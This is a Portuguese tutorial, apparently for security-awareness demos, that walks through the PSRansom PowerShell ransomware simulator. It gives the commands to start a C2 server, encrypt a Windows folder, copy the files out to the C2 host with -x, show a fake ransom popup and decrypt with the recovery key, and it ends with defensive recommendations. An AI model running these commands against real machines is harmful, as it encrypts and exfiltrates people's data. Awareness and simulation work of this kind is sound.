## PSRansom - Simulação de Ransomware com C2

PSRansom ​​é um script escrito em PowerShell que permite simular o funcionamento de um Ransomware. É um script que você pode utilizar por exemplo em uma apresentação de conscientização sobre os riscos e o impacto que um ransomware pode causar.

🔴 O uso indevido desta técnica é de sua total responsabilidade e está sujeito as penalizações prevista na Lei 12.737.

## Como Usar

01 - Realize o clone do projeto PSRansom

```bash
git clone https://github.com/JoelGMSec/PSRansom
```

02 - Entre no diretorio dos arquivos

```bash
cd PSRansom
```

03 - Use o comando para vizualizar todos arquivos contido no diretorio

```bash
ls -l
```

04 - Inicie o C2 Server através do comando a seguir:

```bash
pwsh C2Server.ps1 + 80
```

05 - No host Windows criei a pasta 100SECURITY com alguns arquivos como exemplo.

06 - Realize o download do PSRansom no Windows e execute o comando a seguir:

```bash
.\PSRansom.ps1 -e C:\100SECURITY -s 192.168.0.76 -p 80 -x
```

- C:\100SECURITY : Pasta Alvo
- 192.168.0.76 : Servidor C2
- 80 : Porta de conexão com o servidor C2
- -x : Realiza a cópia dos arquivos para o servidor C2

07 - No servidor C2 o atacante recebe a lista de arquivos que foram criptografados e a Chave de Recuperação.

```bash
Chave de Recuperação : WNLmTxjnDpzZGaEF4AsUYgi5
```

Arquivos `criptografados` com a extensão `.psr`

08 - Dentro da pasta C2Files o atacante recebe uma cópia de todos os arquivos antes da criptografia.

```bash
cd CS2Files
```

```bash
ls -l
```

07 - Observe que foi criado o arquivo readme.txt contendo a Chave de Recuperação dos arquivos.

```bash
Recovery Key : WNLmTxjnDpzZGaEF4AsUYgi5
```

08 - Para recuperar os arquivos basta digitar o comando a seguir :

```bash
.\PSRansom.ps1 -d C:\100SECURITY -K WNLmTxjnDpzZGaEF4AsUYgi5
```

Arquivos recuperados com sucesso!

🔴   Exibindo uma mensagem da Tela do Usuário
Para exibir a mensagem basta utilizar o parâmetro -demo :

```bash
.\PSRansom.ps1 -e C:\100SECURITY -s 192.168.0.76 -p 80 -x -demo
```

💀 Mensagem!

Se o usuário clicar em Pay Now! é exibido um pop-up na tela.

## 🔓 Observações
O impacto e o prejuízo financeiro que este tipo de ataque por causar nas empresa é muito grande, segue algumas recomendações :

Conscientize de forma constante os colaboradores da sua empresa, sobre os riscos de segurança
Realize exercícios e simulações de Phishing, Ransomware, Engenharia Social, etc.
Invista em soluções de segurança como EDRs, AVs, Firewall, WAF, etc.
Se possível monte um time interno de segurança em sua empresa para realizar simulações de ataques reais.
Contrate uma consultoria especializada para avaliar seu ambiente de forma independente e periódica.
Leve a segurança dos dados da sua empresa e de seus clientes a sério!






